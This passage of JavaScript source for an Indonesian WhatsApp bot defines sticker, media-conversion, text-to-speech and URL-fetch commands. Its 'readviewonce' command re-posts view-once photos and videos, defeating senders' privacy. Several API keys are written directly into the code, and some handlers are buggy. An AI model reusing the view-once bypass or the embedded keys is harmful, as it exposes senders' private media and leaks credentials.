    if (/audio/.test(mime)) {
      reply(mess.wait);
      let media = await HuBotZ.downloadAndSaveMediaMessage(quoted);
      let ran = getRandom('.mp3');
      exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
        fs.unlinkSync(media);
        if (err) return m.reply(err);
        let buff = fs.readFileSync(ran);
        HuBotZ.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: m });
        fs.unlinkSync(ran)
      });
      await HuBotZ.sendMessage(m.chat, {
        react: {
          text: '☑️',
          key: m.key,
        }
      });
    } else {
      reply(`Reply Audio Yang Ingin Diganti Suaranya, Dengan Cara *${prefix + command}*`);
    }
  } catch (e) {
    console.log(e);
    await HuBotZ.sendMessage(m.chat, {
      react: {
        text: '❌',
        key: m.key,
      }
    });
    reply('Error Gak Ngaruh🐦');
  }
  addCountCmd(`#${command}`, m.sender, _cmd);
  db.data.users[m.sender].limit -= 1;
  break;
case 'get': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
  if (!isPremium) return reply(mess.OnlyPrem)
  if (!text) return reply('Awali *URL* dengan http:// atau https://');
  const ajg = await fetch(text);
  if (ajg.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
    throw `Content-Length: ${ajg.headers.get('content-length')}`;
  }
  const contentType = ajg.headers.get('content-type');
  if (contentType.startsWith('image/')) {
    return HuBotZ.sendMessage(m.chat, { image: { url: text } }, 'imageMessage', text, { quoted:m });
  }
  if (contentType.startsWith('video/')) {
    return HuBotZ.sendMessage(m.chat, { video: { url: text } }, 'videoMessage', text, { quoted:m });
  }
  if (contentType.startsWith('audio/')) {
    return HuBotZ.sendMessage(m.chat, { audio: { url: text }, mimetype: 'audio/mp4', fileName: `${pushname}.mp3` }, { quoted:m })
  }
  let alak = await ajg.buffer();
  try {
    alak = util.format(JSON.parse(alak + ''));
  } catch (e) {
    alak = alak + '';
  } finally {
    m.reply(alak.slice(0, 65536));
  }
  addCountCmd(`#${command}`, m.sender, _cmd);
  }
  break;
case 'patrick': case 'popoci': case 'sponsbob': case 'kawan-sponsbob': case 'awoawo': case 'chat': case 'dbfly': case 'dino-kuning': case 'doge': case 'gojosatoru': case 'hope-boy': case 'jisoo': case 'kr-robot': case 'kucing': case 'manusia-lidi': case 'menjamet': case 'meow': case 'nicholas': case 'tyni':
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
let dino = `https://api.zeeoneofc.my.id/api/telegram-sticker/${command}?apikey=${global.ZeeApi}`
HuBotZ.sendImageAsSticker(m.chat, dino, m, {packname: `Created By ${global.botname}\n${tanggal(new Date())}` , author: `Owner ${global.ownername}\nTime ${time}` })
  addCountCmd(`#${command}`, m.sender, _cmd);
db.data.users[m.sender].limit -= 1
break
case 'stiker': 
case 'sticker': 
case 's': 
case 'stickergif': 
case 'sgif': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!quoted) return reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
addCountCmd('#sticker', m.sender, _cmd)
await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'⌛',
        key: m.key,
    }})
    try {
if (/image/.test(mime)) {
let media = await HuBotZ.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await HuBotZ.imgToSticker(m.chat, media, m, { packname: `Created By ${global.botname}\n${tanggal(new Date())}` , author: `Owner ${global.ownername}\nTime ${time}` })
await fs.unlinkSync(media)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await HuBotZ.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await HuBotZ.vidToSticker(m.chat, media, m, { packname: `Created By ${global.botname}\n${tanggal(new Date())}` , author: `Owner ${global.ownername}\nTime ${time}` })
await fs.unlinkSync(media)
} else if (/sticker/.test(mime)) {
let media = await HuBotZ.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await HuBotZ.sendImageAsSticker(from, media, m, {packname: `Created By ${global.botname}\n${tanggal(new Date())}` , author: `Owner ${global.ownername}\nTime ${time}` })
await fs.unlinkSync(media)
await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'☑️',
        key: m.key,
    }})
} else reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
} catch (e) {
console.log(e)
await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'❌',
        key: m.key,
    }})
m.reply('Error Dikit Gak Ngaruh🐦')
}
  addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1;
break
/*case 'swm': 
case 'steal': 
case 'stickerwm': 
case 'wm': {
if (!args.join(" ")) return reply(`Mana Text Nya?`)
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return reply (`${mess.EndLimit}`)
addCountCmd('#swm', m.sender, _cmd)
    await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'⌛',
        key: m.key,
    }})
await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'☑️',
        key: m.key,
    }})
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (m.quoted.isAnimated === true) {
HuBotZ.downloadAndSaveMediaMessage(quoted, "gifee")
HuBotZ.sendMessage(m.chat, { sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await HuBotZ.sendImageAsSticker(m.chat, media, m, {packname: `${pcknm}`, author: `${atnm}`})
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 Detik!')
let media = await quoted.download()
let encmedia = await HuBotZ.sendImageAsSticker(m.chat, media, m, {packname: `${pcknm}`, author: `${atnm}`})
await fs.unlinkSync(encmedia)
} else {
replygcHuBotZ(`Photo/Video?`)
}
db.data.users[m.sender].limit -= 1
}
break*/
case 'swm': case 'steal': case 'stickerwm': case 'wm':{
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!args.join(" ")) return reply(`Mana Text Nya?`)
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
    await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'⌛',
        key: m.key,
    }})
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (m.quoted.isAnimated === true) {
HuBotZ.downloadAndSaveMediaMessage(quoted, "gifee")
HuBotZ.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await HuBotZ.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 Detik!')
let media = await quoted.download()
let encmedia = await HuBotZ.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'☑️',
        key: m.key,
    }})
fs.unlinkSync(encmedia)
} else {
await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'❌',
        key: m.key,
    }})
}
addCountCmd(`#${command}`, m.sender, _cmd);
db.data.users[m.sender].limit -= 1
}
break
case 'smeme':
case 'stickmeme':
case 'stikmeme':
case 'stickermeme':
case 'stikermeme': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
    let respond = `Kirim/reply gambar/stiker dengan keterangan ${prefix + command} teks1|teks2`
    if (!/image/.test(mime)) return reply(respond)
    if (!text) return reply(respond)
    addCountCmd('#smeme', m.sender, _cmd)
    await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'⌛',
        key: m.key,
    }})
    try {
    atas = text.split('|')[0] ? text.split('|')[0] : '-'
    bawah = text.split('|')[1] ? text.split('|')[1] : '-'
    let dwnld = await HuBotZ.downloadAndSaveMediaMessage(quoted)
    let { TelegraPh } = require('./lib/uploader')
    let fatGans = await TelegraPh(dwnld)
    let smeme = await getBuffer(`https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans}`)
    let FaTiH = await HuBotZ.sendImageAsSticker(m.chat, smeme, m, { packname: `Created By ${global.botname}\n${tanggal(new Date())}` , author: `Owner ${global.ownername}\nTime ${time}` })
    await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'☑️',
        key: m.key,
    }})
    } catch (er) {
    console.log(er)
    await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'❌',
        key: m.key,
    }})
    m.reply('Error Dikit Gak Ngaruh🐦')
    }
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
break
case 'qc': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
      if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit);
      if (!text || !quoted) return reply(`Contoh Penggunaan: ${prefix+command} Hai Ngab`)
      if (text.length > 30) return reply(`Text Terlalu Panjang, Maksimal 30 Karakter`)
      await HuBotZ.sendMessage(m.chat, {
    react: {
        text: '⌛',
        key: m.key,
    }})
   try {
      try {
         pic = await HuBotZ.profilePictureUrl(m.quoted ? m.quoted.sender : m.sender, 'image')
      } catch {
         pic = 'https://srv.neoxr.tk/files/z8hI5T.jpg'
      }
      const obj = {
         "type": "quote",
         "format": "png",
         "backgroundColor": "#FFFFFF",
         "width": 512,
         "height": 768,
         "scale": 2,
         "messages": [{
            "entities": [],
            "avatar": true,
            "from": {
               "id": 1,
               "name": pushname,
               "photo": {
                  "url": pic
               }
            },
            "text": text,
            "replyMessage": {}
         }]
      }
      const json = await axios.post('https://quote-api.neoxr.eu/generate', obj, {
         headers: {
            'Content-Type': 'application/json'
         }
      })    
      const buffer = Buffer.from(json.data.result.image, 'base64')
      HuBotZ.sendImageAsSticker(m.chat, buffer, m, {
         packname: `Created By ${global.botname}\n${tanggal(new Date())}`,
         author: `Owner ${global.ownername}\nTime ${time}`
      })
      await HuBotZ.sendMessage(m.chat, {
    react: {
        text: '✔️',
        key: m.key,
    }})
   } catch (e) {
      console.log(e)
      await HuBotZ.sendMessage(m.chat, {
    react: {
        text: '❌',
        key: m.key,
    }})
      reply('Error Dikit Gak Ngaruh 🐦')
   }
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
break
case 'tourl': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!quoted) return reply('Reply Gambar/Video! Dengan Maksimal 5 Mb')
await HuBotZ.sendMessage(m.chat, {
    react: {
        text: '⌛',
        key: m.key,
    }})
    try {
let media = await HuBotZ.downloadAndSaveMediaMessage(quoted);
if (/image/.test(mime)) {
let anu = await TelegraPh(media);
reply(`*Host Name:* Telegra.ph\n*Expired:* -/-\n*Url:* ${util.format(anu)}`);
} else if (!/image/.test(mime)) {
let auu = await Pomf(media);
reply(`*Host Name:* Pomf\n*Expired:* -/-\n*Url:* ${util.format(auu)}`);
}
await HuBotZ.sendMessage(m.chat, {
    react: {
        text: '✔️',
        key: m.key,
    }})
    fs.unlinkSync(media);
    } catch (er) {
    console.log(er)
    await HuBotZ.sendMessage(m.chat, {
    react: {
        text: '❌',
        key: m.key,
    }})
    m.reply('Error Dikit Gak Ngaruh🐦')
    }
addCountCmd(`#${command}`, m.sender, _cmd);
    }
db.data.users[m.sender].limit -= 1;
break;
case 'gptwhispers':
case 'gptwhisper':
case 'whispersgpt':
case 'whispergpt':
case 'whisper':
case 'whispers': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium) return reply(mess.OnlyPrem)
if (!quoted) return reply(`Reply Audio/vn Dengan Caption ${prefix + command}`)
        let pepe = await HuBotZ.downloadAndSaveMediaMessage(quoted);
        let pepek = await Pomf(pepe); 
        try {
        if (/audio/.test(mime)) {
  await HuBotZ.sendMessage(m.chat, { 
        react: { 
            text: '⌛', 
            key: m.key 
        }});
        const responnya = await fetch(`https://api.miftahganzz.my.id/api/ai/gpt-whisper?url=${encodeURIComponent(pepek)}&apikey=${global.miftah}`)
    HuBotZ.sendMessage(m.chat, {
      text: `${data.text}` }, {quoted: m});
  await HuBotZ.sendMessage(m.chat, { 
        react: { 
            text: '✔️', 
            key: m.key 
        }});
        } else {
        reply(`Reply Audio/vn Dengan Caption ${prefix + command}`)
        }
        } catch (er) {
        console.log(er)
  await HuBotZ.sendMessage(m.chat, { 
        react: { 
            text: '❌', 
            key: m.key 
        }});
        m.reply('Error Dikit Gak Ngaruh 🐦')
        }       
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'gptvoice':
case 'voicegpt': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium) return reply(mess.OnlyPrem)
if (!text) return reply(`Inpit Text With Caption *${prefix + command} text* `)
  await HuBotZ.sendMessage(m.chat, { 
        react: { 
            text: '⌛', 
            key: m.key 
        }});
try {
const responnya = await fetch(`https://api.zonerweb.biz.id/api/ai/gptvoice?query=${encodeURIComponent(text)}&apikey=TofikMd68`)
const result = await responnya.buffer();
HuBotZ.sendMessage(m.chat, {
audio: result,
mimetype: 'audio/mpeg',
ptt: true
}, { quoted: m })
} catch (e) {
console.error(e)
  await HuBotZ.sendMessage(m.chat, { 
        react: { 
            text: '❌', 
            key: m.key 
        }});
}
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'tomp4': 
case 'tovideo': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
                if (!quoted) return reply('Mana Stickernya?')
                if (!/webp/.test(mime)) return reply(`Reply Sticker Dengan Caption ${prefix + command}`)
                await HuBotZ.sendMessage(m.chat, {
                    react: {
                        text:'⌛',
                        key: m.key,
                        }})
                try {
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await HuBotZ.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await HuBotZ.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await HuBotZ.sendMessage(m.chat, {
                react: {
                    text: '☑️',
                    key: m.key,
                        }})
                    } catch (er) {
    console.log(er)
    await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'❌',
        key: m.key,
    }})
    m.reply(mess.emror.feature)
    }
    }
    db.data.users[m.sender].limit -= 1
    fs.unlinkSync(media)
addCountCmd(`#${command}`, m.sender, _cmd);
    break
case 'toimage': 
case 'toimg': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
addCountCmd('#toimage', m.sender, _cmd)
if (!quoted) return reply('Reply Image')
await HuBotZ.sendMessage(m.chat, {
                    react: {
                        text:'⌛',
                        key: m.key,
                        }})
                        try {
if (!/webp/.test(mime)) return reply(`Balas sticker dengan caption *${prefix + command}*`)
reply(mess.wait)
let media = await HuBotZ.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buffer = fs.readFileSync(ran)
HuBotZ.sendMessage(m.chat, { image: buffer }, { quoted: m })
})
                await HuBotZ.sendMessage(m.chat, {
                    react: {
                        text:'☑️',
                        key: m.key,
                        }})
                        fs.unlinkSync(ran)
} catch (e) {
console.log(e)
await HuBotZ.sendMessage(m.chat, {
react: {
text:'❌',
key: m.key,
}})
m.reply(mess.emror.feature)
}
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
break
case 'readvo': 
case 'readviewonce': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.quoted) m.reply('Reply gambar/video yang ingin Anda lihat')
  if (m.quoted.mtype !== 'viewOnceMessageV2') m.reply('Ini bukan pesan view-once.')
  await HuBotZ.sendMessage(m.chat, {
  react: {
  text:'⌛',
  key: m.key,
  }})
  try {
  let msg = m.quoted.message
  let type = Object.keys(msg)[0]
  let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
  let buffer = Buffer.from([])
  for await (const chunk of media) {
    buffer = Buffer.concat([buffer, chunk])
  }
  if (/video/.test(type)) {
    return HuBotZ.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
  } else if (/image/.test(type)) {
    return HuBotZ.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
  }
  await HuBotZ.sendMessage(m.chat, {
  react: {
  text: '☑️',
  key: m.key,
  }})
} catch (e) {
console.log(e)
await HuBotZ.sendMessage(m.chat, {
react: {
text:'❌',
key: m.key,
}})
m.reply(mess.emror.feature)
}
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'toptv': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
await HuBotZ.sendMessage(m.chat, {
  react: {
  text:'⌛',
  key: m.key,
  }})
try {
const { toPTT } = require('./lib/converter')
const { MessageType } = require('@whiskeysockets/baileys')
  let q = m.quoted ? m.quoted : m
  if (!/video|audio/.test(mime)) m.reply(`Balas video atau voice note yang ingin diubah ke mp3 dengan caption *${prefix + command}*`)
  let media = await q.download()
let dataVideo = { ptvMessage: m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage }
HuBotZ.relayMessage(m.chat, dataVideo, {})
  await HuBotZ.sendMessage(m.chat, {
  react: {
  text: '☑️',
  key: m.key,
  }})
} catch (e) {
console.log(e)
await HuBotZ.sendMessage(m.chat, {
react: {
text:'❌',
key: m.key,
}})
m.reply(mess.emror.feature)
}
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1 
break
case 'tovn': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
addCountCmd('#tovn', m.sender, _cmd)
await HuBotZ.sendMessage(m.chat, {
  react: {
  text:'⌛',
  key: m.key,
  }})
  try {
 if (!/video/.test(mime) && !/audio/.test(mime)) return newReply (`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!quoted) return m.reply(`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption *${prefix + command}*`)
newReply(mess.wait)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
HuBotZ.sendMessage(m.chat, {audio, mimetype:'audio/mpeg', ptt: true}, { quoted : m })
  await HuBotZ.sendMessage(m.chat, {
  react: {
  text: '☑️',
  key: m.key,
  }})
} catch (e) {
console.log(e)
await HuBotZ.sendMessage(m.chat, {
react: {
text:'❌',
key: m.key,
}})
m.reply(mess.emror.feature)
}
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
break
case 'toaudio': 
case 'tomp3': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
addCountCmd('#tomp3', m.sender, _cmd)
await HuBotZ.sendMessage(m.chat, {
  react: {
  text:'⌛',
  key: m.key,
  }})
  try {
 if (!/video/.test(mime) && !/audio/.test(mime)) return newReply (`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!quoted) return m.reply(`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption *${prefix + command}*`)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
HuBotZ.sendMessage(m.chat, {audio, mimetype: 'audio/mpeg'}, { quoted : m })
  await HuBotZ.sendMessage(m.chat, {
  react: {
  text: '☑️',
  key: m.key,
  }})
} catch (e) {
console.log(e)
await HuBotZ.sendMessage(m.chat, {
react: {
text:'❌',
key: m.key,
}})
m.reply(mess.emror.feature)
}
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
break
case 'ttp':
case 'attp': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!q) return m.reply(`Example : *${prefix + command}* Hai Ngab`)
if (q.length > 20) return m.reply('Maksimal 20 karakter!')
addCountCmd('#attp', m.sender, _cmd)
await HuBotZ.sendMessage(m.chat, {
  react: {
  text:'⌛',
  key: m.key,
  }})
  try {
HuBotZ.sendImageAsSticker(from, `https://aemt.me/${command}?text=${text}`, m, { packname: `Created By ${global.botname}\n${tanggal(new Date())}` , author: `Owner ${global.ownername}\nTime ${time}` })
  await HuBotZ.sendMessage(m.chat, {
  react: {
  text: '☑️',
  key: m.key,
  }})
} catch (e) {
console.log(e)
await HuBotZ.sendMessage(m.chat, {
react: {
text:'❌',
key: m.key,
}})
m.reply(mess.emror.feature)
}
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
break
case 'emojimix': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
addCountCmd('#emojimix', m.sender, _cmd)
await HuBotZ.sendMessage(m.chat, {
  react: {
  text:'⌛',
  key: m.key,
  }})
  try {
let [emoji1, emoji2] = text.split`+`
if (!emoji1) return newReply(`Example : ${prefix + command} 😅+💩`)
if (!emoji2) return newReply(`Example : ${prefix + command} 😅+💩`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await HuBotZ.sendImageAsSticker(m.chat, res.url, m, { packname: `Created By ${global.botname}\n${tanggal(new Date())}` , author: `Owner ${global.ownername}\nTime ${time}`, categories: res.tags })
}
  await HuBotZ.sendMessage(m.chat, {
  react: {
  text: '☑️',
  key: m.key,
  }})
} catch (e) {
console.log(e)
await HuBotZ.sendMessage(m.chat, {
react: {
text:'❌',
key: m.key,
}})
m.reply(mess.emror.feature)
}
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
break
/*case 'texttosound':
case 'tts': {
if (!isPremium && !isCreator) return reply(mess.OnlyPrem)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *text|bahasa*`)
if (!q.includes('|')) return m.reply(`Gunakan dengan cara ${prefix+command} *text|bahasa*`)
await HuBotZ.sendMessage(m.chat, {
  react: {
  text:'⌛',
  key: m.key,
  }})
try {
pepek = args.join(' ')
tx = pepek.split("|")[0];
bs = pepek.split("|")[1]; 
let tts = await axios.get(`https://api.ibeng.tech/api/others/tts?text=${tx}&lang=${bs}&apikey=${global.ibeng}`)
HuBotZ.sendMessage(from, { audio: { url: tts.data.audio }, mimetype: 'audio/mp4', ptt: true, fileName: `${text}.mp3` }, { quoted: m })
  await HuBotZ.sendMessage(m.chat, {
  react: {
  text: '☑️',
  key: m.key,
  }})
} catch (e) {
console.log(e)
await HuBotZ.sendMessage(m.chat, {
react: {
text:'❌',
key: m.key,
}})
m.reply('Error Dikit Gak Ngaruh🐦')
}
}
break*/
case 'tts': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && !isCreator) return reply(mess.OnlyPrem)
if (!quoted) return m.reply(`Reply Teks Atau Kirim : *${prefix + command} Hai Ngab id*`)
await HuBotZ.sendMessage(m.chat, {
  react: {
  text:'⌛',
  key: m.key,
  }})
try {
const { tts } = require('google-tts-api');
        let ok = args.join(" ");
        let tx = ok.split(" ")[0];
        let oke = ok.split(" ")[1];
            const audiourl = tts.getAudioUrl(tx, {
                lang: `${oke}`,
                slow: false,
                host: "https://translate.google.com",
            });
                HuBotZ.sendMessage(from, {
                audio: {
                    url: audiourl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${quoted}.mp3`,
            }, {
                quoted: m,
            });
            await HuBotZ.sendMessage(m.chat, {
                react: {
                    text: '☑️',
                    key: m.key,
                }})
        } catch (e) {
            console.log(e)
            await HuBotZ.sendMessage(m.chat, {
                react: {
                    text:'❌',
                    key: m.key,
                }})
            m.reply(mess.emror.feature)
        }
addCountCmd(`#${command}`, m.sender, _cmd);
        }
        break
case 'micmonster': 
case 'micmons':
case 'textsoundmic':
case 'micsound': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && !isCreator && !isMods) return reply(mess.OnlyPrem)
let ListVoice = [
        "af-ZA-AdriNeural",
        "af-ZA-WillemNeural",
        "am-ET-AmehaNeural",
        "am-ET-MekdesNeural",
        "ar-AE-FatimaNeural",
        "ar-AE-HamdanNeural",
        "ar-BH-AliNeural",
        "ar-BH-LailaNeural",
        "ar-DZ-AminaNeural",
        "ar-DZ-IsmaelNeural",
        "ar-EG-SalmaNeural",
        "ar-EG-ShakirNeural",
        "ar-IQ-BasselNeural",
        "ar-IQ-RanaNeural",
        "ar-JO-SanaNeural",
        "ar-JO-TaimNeural",
        "ar-KW-FahedNeural",
        "ar-KW-NouraNeural",
        "ar-LB-LaylaNeural",
        "ar-LB-RamiNeural",
        "ar-LY-ImanNeural",
        "ar-LY-OmarNeural",
        "ar-MA-JamalNeural",
        "ar-MA-MounaNeural",
        "ar-OM-AbdullahNeural",
        "ar-OM-AyshaNeural",
        "ar-QA-AmalNeural",
        "ar-QA-MoazNeural",
        "ar-SA-HamedNeural",
        "ar-SA-ZariyahNeural",
        "ar-SY-AmanyNeural",
        "ar-SY-LaithNeural",
        "ar-TN-HediNeural",
        "ar-TN-ReemNeural",
        "ar-YE-MaryamNeural",
        "ar-YE-SalehNeural",
        "az-AZ-BabekNeural",
        "az-AZ-BanuNeural",
        "bg-BG-BorislavNeural",
        "bg-BG-KalinaNeural",
        "bn-BD-NabanitaNeural",
        "bn-BD-PradeepNeural",
        "bn-IN-BashkarNeural",
        "bn-IN-TanishaaNeural",
        "bs-BA-GoranNeural",
        "bs-BA-VesnaNeural",
        "ca-ES-AlbaNeural",
        "ca-ES-EnricNeural",
        "ca-ES-JoanaNeural",
        "cs-CZ-AntoninNeural",
        "cs-CZ-VlastaNeural",
        "cy-GB-AledNeural",
        "cy-GB-NiaNeural",
        "da-DK-ChristelNeural",
        "da-DK-JeppeNeural",
        "de-AT-IngridNeural",
        "de-AT-JonasNeural",
        "de-CH-JanNeural",
        "de-CH-LeniNeural",
        "de-DE-AmalaNeural",
        "de-DE-BerndNeural",
        "de-DE-ChristophNeural",
        "de-DE-ConradNeural",
        "de-DE-ElkeNeural",
        "de-DE-GiselaNeural",
        "de-DE-KasperNeural",
        "de-DE-KatjaNeural",
        "de-DE-KillianNeural",
        "de-DE-KlarissaNeural",
        "de-DE-KlausNeural",
        "de-DE-LouisaNeural",
        "de-DE-MajaNeural",
        "de-DE-RalfNeural",
        "de-DE-TanjaNeural",
        "el-GR-AthinaNeural",
        "el-GR-NestorasNeural",
        "en-AU-AnnetteNeural",
        "en-AU-CarlyNeural",
        "en-AU-DarrenNeural",
        "en-AU-DuncanNeural",
        "en-AU-ElsieNeural",
        "en-AU-FreyaNeural",
        "en-AU-JoanneNeural",
        "en-AU-KenNeural",
        "en-AU-KimNeural",
        "en-AU-NatashaNeural",
        "en-AU-NeilNeural",
        "en-AU-TimNeural",
        "en-AU-TinaNeural",
        "en-AU-WilliamNeural",
        "en-CA-ClaraNeural",
        "en-CA-LiamNeural",
        "en-GB-AbbiNeural",
        "en-GB-AlfieNeural",
        "en-GB-BellaNeural",
        "en-GB-ElliotNeural",
        "en-GB-EthanNeural",
        "en-GB-HollieNeural",
        "en-GB-LibbyNeural",
        "en-GB-MaisieNeural",
        "en-GB-MiaNeural",
        "en-GB-NoahNeural",
        "en-GB-OliverNeural",
        "en-GB-OliviaNeural",
        "en-GB-RyanNeural",
        "en-GB-SoniaNeural",
        "en-GB-ThomasNeural",
        "en-HK-SamNeural",
        "en-HK-YanNeural",
        "en-IE-ConnorNeural",
        "en-IE-EmilyNeural",
        "en-IN-NeerjaNeural",
        "en-IN-PrabhatNeural",
        "en-KE-AsiliaNeural",
        "en-KE-ChilembaNeural",
        "en-NG-AbeoNeural",
        "en-NG-EzinneNeural",
        "en-NZ-MitchellNeural",
        "en-NZ-MollyNeural",
        "en-PH-JamesNeural",
        "en-PH-RosaNeural",
        "en-SG-LunaNeural",
        "en-SG-WayneNeural",
        "en-TZ-ElimuNeural",
        "en-TZ-ImaniNeural",
        "en-US-AIGenerate1Neural",
        "en-US-AIGenerate2Neural",
        "en-US-AmberNeural",
        "en-US-AnaNeural",
        "en-US-AriaNeural",
        "en-US-AshleyNeural",
        "en-US-BlueNeural",
        "en-US-BrandonNeural",
        "en-US-ChristopherNeural",
        "en-US-CoraNeural",
        "en-US-DavisNeural",
        "en-US-ElizabethNeural",
        "en-US-EricNeural",
        "en-US-GuyNeural",
        "en-US-JacobNeural",
        "en-US-JaneNeural",
